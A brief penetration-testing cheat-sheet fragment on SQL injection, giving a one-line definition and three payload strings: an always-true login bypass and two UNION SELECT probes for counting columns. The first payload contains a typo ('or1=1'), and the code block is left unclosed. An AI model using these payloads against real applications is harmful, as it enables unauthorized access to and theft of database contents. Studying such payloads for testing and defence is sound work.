#### SQL Injection Methodology
SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).

```
' or1=1-- -

' UNION SELECT NULL,NULL,NULL,NULL-- -

' UNION SELECT 1,2,3,4-- -
